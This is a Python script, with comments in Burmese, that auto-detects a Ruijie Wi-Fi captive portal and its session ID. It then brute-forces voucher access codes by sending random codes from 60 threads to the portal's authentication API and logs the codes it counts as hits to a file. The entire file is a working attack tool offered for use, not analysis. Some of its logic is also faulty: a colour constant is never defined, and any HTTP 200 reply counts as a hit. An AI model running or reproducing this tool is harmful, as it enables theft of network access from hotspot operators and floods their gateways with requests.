import requests
import threading
import random
import os
import time
import string
import re
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)
C_CYAN = Fore.CYAN + Style.BRIGHT
C_GREEN = Fore.GREEN + Style.BRIGHT
C_RED = Fore.RED + Style.BRIGHT
C_YELLOW = Fore.YELLOW + Style.BRIGHT
C_WHITE = Fore.WHITE + Style.BRIGHT

# --- [ GLOBAL STATS ] ---
total_tried = 0
found_hits = 0
found_list = []
start_time = time.time()
stop_event = threading.Event()

def get_portal_info():
    """URL မလိုဘဲ Portal နဲ့ SID ကို Auto ရှာပေးတဲ့ Logic"""
    print(f"{C_CYAN}[*] Detecting Ruijie Gateway & Session ID...{C_RESET}")
    try:
        # Google ကို လှမ်းခေါက်ပြီး Portal Redirect ကို ဖမ်းသည်
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        r = requests.get(test_url, allow_redirects=True, timeout=10)
        portal_url = r.url
        
        # URL ထဲမှ sessionId ကို ရှာသည်
        sid_match = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', portal_url)
        if sid_match:
            sid = sid_match.group(1)
            parsed = urlparse(portal_url)
            api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
            return sid, api_url
        else:
            return None, None
    except:
        return None, None

def banner(sid, api_url, threads):
    os.system('clear')
    elapsed = time.time() - start_time
    speed = total_tried / elapsed if elapsed > 0 else 0
    print(f"{C_YELLOW}⚡ RUIJIE EXTREME SPEED SCANNER (AUTO) ⚡")
    print(f"{C_WHITE}="*45)
    print(f"{C_CYAN}[GATEWAY]  : {C_WHITE}{api_url}")
    print(f"{C_CYAN}[THREADS]  : {C_WHITE}{threads} active")
    print(f"{C_CYAN}[SESSION]  : {C_WHITE}{sid[:15]}...")
    print(f"{C_WHITE}="*45)
    print(f"{C_CYAN}[TOTAL TRIED] : {C_WHITE}{total_tried:,}")
    print(f"{C_CYAN}[FOUND HITS]  : {C_GREEN}{found_hits}")
    print(f"{C_CYAN}[LIVE SPEED]  : {C_YELLOW}{speed:.2f} codes/sec")
    print(f"{C_WHITE}="*45)
    print(f"{C_YELLOW}[SUCCESS CODES]:")
    for code in found_list[-5:]:
        print(f" {C_GREEN}> ✅ {code}")
    print(f"{C_WHITE}="*45)
    print(f"{C_WHITE}(CTRL+C TO STOP)")

def scan_logic(sid, api_url):
    global total_tried, found_hits
    # ဂဏန်းနှင့် စာလုံးအသေး ရောစပ်ခြင်း
    chars = string.ascii_lowercase + string.digits
    while not stop_event.is_set():
        length = random.randint(6, 7)
        code = "".join(random.choice(chars) for _ in range(length))
        try:
            total_tried += 1
            res = requests.post(api_url, json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, timeout=5)
            if "success" in res.text.lower() or res.status_code == 200:
                found_hits += 1
                found_list.append(code)
                with open("found_vouchers.txt", "a") as f:
                    f.write(f"CODE: {code} | {time.ctime()}\n")
        except: pass

def main():
    os.system('clear')
    sid, api_url = get_portal_info()
    
    if sid and api_url:
        threads_count = 60 # အရှိန်မြှင့်ရန် Thread တိုးထားသည်
        for i in range(threads_count):
            threading.Thread(target=scan_logic, args=(sid, api_url), daemon=True).start()
            
        try:
            while True:
                banner(sid, api_url, threads_count)
                time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{C_RED}[!] Stopped.")
    else:
        print(f"{C_RED}[X] Auto-Detection Failed!")
        print(f"{C_YELLOW}[!] Please open your browser and visit any site to trigger Portal first.")

if __name__ == "__main__":
    main()
